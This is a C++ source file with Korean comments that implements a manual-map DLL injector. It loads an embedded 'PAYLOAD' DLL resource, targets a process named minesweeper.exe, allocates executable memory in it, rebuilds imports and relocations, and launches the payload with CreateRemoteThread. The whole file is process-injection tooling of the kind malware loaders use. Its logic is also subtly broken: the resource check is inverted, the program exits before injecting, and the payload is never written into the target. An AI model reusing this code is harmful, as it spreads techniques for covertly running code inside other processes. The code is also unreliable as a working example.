#include <Windows.h>
#include <iostream>
#include <libloaderapi.h>
#include <vector>
#include <winnt.h>
#include <TlHelp32.h>
#include <process.h>
#include <atlstr.h>


using namespace std;


BOOL CALLBACK CallBackEnumNameFunc(HMODULE hModule, LPCTSTR lpszType, LPTSTR lpszName, LONG_PTR lParam) {
    HRSRC* phRsrc = reinterpret_cast<HRSRC*>(lParam);
    HRSRC hRsrc = FindResource(hModule, lpszName, lpszType);
    if (hRsrc == NULL) {
        return TRUE;
    }
    else {
        *phRsrc = hRsrc;
        return FALSE;
    }
    return TRUE;
}


int main(int argc, char** args) {
    HANDLE hProcess = NULL;
    LPCSTR lpszDllPath = NULL;
    SIZE_T dwDLLpathLen = 0;
    DWORD targetPid = 0;
    string targetExe = "";

    if (argc < 3){
        printf("[!] Usage : \"PID\" \"TARGET.EXE\"");
        exit(-1);
    }

    targetPid = atoi(args[1]);
    targetExe = args[2];

    cout << "[+] TARGET PID : " << targetPid << endl;
    cout << "[+] TARGET EXE : " << targetExe << endl;


    HMODULE hModule = GetModuleHandle(NULL);
    if (!hModule) return false;

    HRSRC hRsrcInfo = NULL;
    /*if (EnumResourceNamesEx(NULL, L"PAYLOAD", (ENUMRESNAMEPROCW)CallBackEnumNameFunc, reinterpret_cast<LPARAM>(&hRsrcInfo), RESOURCE_ENUM_LN | RESOURCE_ENUM_MUI, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL)) == NULL) {*/
    if(hRsrcInfo = FindResource(GetModuleHandle(NULL),L"PAYLOAD",L"dll")){
        // ERROR_RESOURCE_ENUM_USER_STOP
        printf("[!] Error - EnumResourceNamesEx()1 - %d\n", GetLastError());
        return FALSE;
    }
    cout << "hRsrcInfo : " << hRsrcInfo << endl;
    if (hRsrcInfo == NULL) return FALSE;

    

    HGLOBAL hResData = LoadResource(NULL, hRsrcInfo);
    LPVOID lpPayload = LockResource(hResData);
    DWORD dwRsrcSize = SizeofResource(GetModuleHandle(NULL), hRsrcInfo);


    PIMAGE_DOS_HEADER pImageDOSHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(lpPayload);
    PIMAGE_NT_HEADERS pImageNTHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<DWORD>(lpPayload) + pImageDOSHeader->e_lfanew);

    HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, pImageNTHeader->OptionalHeader.SizeOfImage, NULL);
    if (hMapping == NULL) {
        printf("[!] Error - CreateFileMapping() - %d\n", GetLastError());
        TerminateProcess(GetCurrentProcess(), -1);
    }
    // 주소 공간 상에 가상 메모리에 맵핑을 수행
    LPVOID lpMapping = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, 0);
    if (lpMapping == NULL) {
        printf("[!] Error - MapViewOfFile() - %d\n", GetLastError());
        TerminateProcess(GetCurrentProcess(), -1);
    }

    CopyMemory(lpMapping, lpPayload, pImageNTHeader->OptionalHeader.SizeOfHeaders);

    for (int i = 0; i < pImageNTHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pImageSectionHeader = reinterpret_cast<PIMAGE_SECTION_HEADER>(reinterpret_cast<DWORD>(lpPayload) + pImageDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i);
        CopyMemory(reinterpret_cast<LPVOID>(reinterpret_cast<DWORD>(lpMapping) + pImageSectionHeader->VirtualAddress), reinterpret_cast<LPVOID>(reinterpret_cast<DWORD>(lpPayload) + pImageSectionHeader->PointerToRawData), pImageSectionHeader->SizeOfRawData);
    }

    vector<BYTE> vPayloadData = vector<BYTE>(reinterpret_cast<LPBYTE>(lpMapping), reinterpret_cast<LPBYTE>(lpMapping) + pImageNTHeader->OptionalHeader.SizeOfImage);
    UnmapViewOfFile(lpMapping);
    CloseHandle(hMapping);
    PIMAGE_NT_HEADERS pinh = pImageNTHeader;

    PROCESSENTRY32 pe32;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    // 0x2 == TH32CS_SNAPPROCESS
    HANDLE hSnapshot = CreateToolhelp32Snapshot(0x02, targetPid);

    // Get Process Infomation
    if (!Process32First(hSnapshot, &pe32)) {
        printf("[!] Error - Process32First()2 - %d\n", GetLastError());
        TerminateProcess(GetCurrentProcess(), -1);
    }

    string currentFileName = "minesweeper.exe";

    while (Process32Next(hSnapshot, &pe32)) {
        // Check Process Name
        if (strcmp(CW2A(pe32.szExeFile), currentFileName.c_str()) == 0) {
            // Get Handle to Current Process
            hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
            CloseHandle(hSnapshot);
            if (hProcess == NULL) {
                printf("[!] Error - OpenProcess() - %d\n", GetLastError());
                TerminateProcess(GetCurrentProcess(), -1);
            }
        }
    }

    CloseHandle(hSnapshot);
    printf("[!] Error - GetProcess()\n");
    TerminateProcess(GetCurrentProcess(), -1);

    LPVOID lpAllocAddr = VirtualAllocEx(hProcess, NULL, pinh->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (lpAllocAddr == NULL) {
        printf("[!] Error - EnumResourceNamesEx()3 - %d\n", GetLastError());
        TerminateProcess(GetCurrentProcess(), -1);
    }

    LPVOID lpBaseAddress = GetModuleHandleA("minesweeper.exe");

    if (pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(reinterpret_cast<DWORD>(lpBaseAddress) + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        // 비어있는 IMAGE_IMPORT_DESCRIPTOR가 탐색될 때 까지 Rebuild
        while (pImportDescriptor->Name != NULL) {
            // 로드되는 DLL 이름을 이용하여 핸들을 획득
            LPCSTR lpLibrary = reinterpret_cast<PCHAR>(reinterpret_cast<DWORD>(lpBaseAddress) + pImportDescriptor->Name);
            HMODULE hLibModule = LoadLibraryA(lpLibrary);
            // GET IID(Image Import Discriptor) INFO
            PIMAGE_THUNK_DATA nameRef = reinterpret_cast<PIMAGE_THUNK_DATA>(reinterpret_cast<DWORD>(lpBaseAddress) + pImportDescriptor->Characteristics);
            PIMAGE_THUNK_DATA symbolRef = reinterpret_cast<PIMAGE_THUNK_DATA>(reinterpret_cast<DWORD>(lpBaseAddress) + pImportDescriptor->FirstThunk);
            PIMAGE_THUNK_DATA lpThunk = reinterpret_cast<PIMAGE_THUNK_DATA>(reinterpret_cast<DWORD>(lpBaseAddress) + pImportDescriptor->FirstThunk);
            // 주소(lpThunk에서 가르키는 값)을 수정한다. 즉, 현재 메모리에 로드되어 있는 DLL의 IAT를 현재 로드된 DLL의 주소들로 반복하여 수정한다.
            for (; nameRef->u1.AddressOfData; nameRef++, symbolRef++, lpThunk++) {
                // IMAGE_ORDINAL_FLAG를 이용한 검증은 NONAME으로 적용된 즉, 이름을 숨긴 함수를 찾기위한 방법
                if (nameRef->u1.AddressOfData & IMAGE_ORDINAL_FLAG) {
                    // MAKEINTRESOURCEA() 경우 정수형의 ID를 가지는 포인터를 획득하는 매크로
                    *(FARPROC*)lpThunk = GetProcAddress(hLibModule, MAKEINTRESOURCEA(nameRef->u1.AddressOfData));
                }
                else {
                    PIMAGE_IMPORT_BY_NAME thunkData = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(reinterpret_cast<DWORD>(lpBaseAddress) + nameRef->u1.AddressOfData);
                    *(FARPROC*)lpThunk = GetProcAddress(hLibModule, reinterpret_cast<LPCSTR>(&thunkData->Name));
                }
            }
            FreeLibrary(hLibModule);
            pImportDescriptor++;
        }
    }

    IMAGE_BASE_RELOCATION *fristImageBaseRelocationStruct = reinterpret_cast<IMAGE_BASE_RELOCATION*> (reinterpret_cast<DWORD>(lpBaseAddress) + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

    IMAGE_BASE_RELOCATION *lastBaseRelocationStruct = reinterpret_cast<IMAGE_BASE_RELOCATION*>(reinterpret_cast<DWORD_PTR>(fristImageBaseRelocationStruct) + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size - sizeof(IMAGE_BASE_RELOCATION));

    for (; fristImageBaseRelocationStruct < lastBaseRelocationStruct; fristImageBaseRelocationStruct = reinterpret_cast<IMAGE_BASE_RELOCATION*>(reinterpret_cast<DWORD_PTR>(fristImageBaseRelocationStruct) + fristImageBaseRelocationStruct->SizeOfBlock)) {
        WORD *reloc_item = reinterpret_cast<WORD*>(fristImageBaseRelocationStruct + 1);
        DWORD num_items = (fristImageBaseRelocationStruct->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

        DWORD idx = 0;
        DWORD dwDelta = reinterpret_cast<DWORD>(lpAllocAddr) - pinh->OptionalHeader.ImageBase;
        for (idx = 0; idx < num_items; ++idx, ++reloc_item) {
            // TypeOffset == Type(4bits) + Offset(12bits) 이므로 Type을 확인하기 위해 비트 연산 수행
            switch (*reloc_item >> 12) {
            case IMAGE_REL_BASED_ABSOLUTE:
                break;
            case IMAGE_REL_BASED_HIGHLOW:
                // TypeOffset and 0xFFF는 Type(4)|Offset(12)에서 Type값을 제거하여 나머지 Offset 값을 획득하기 위한 로직
                *(DWORD_PTR*)(reinterpret_cast<DWORD>(lpBaseAddress) + fristImageBaseRelocationStruct->VirtualAddress + (*reloc_item & 0xFFF)) += dwDelta;
                break;
            default:
                return -1;
            }
        }
    }

    DWORD dwEntryPoint = reinterpret_cast<DWORD>(lpAllocAddr) + pinh->OptionalHeader.AddressOfEntryPoint;

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(dwEntryPoint), NULL, 0, NULL);

    return 0;
}

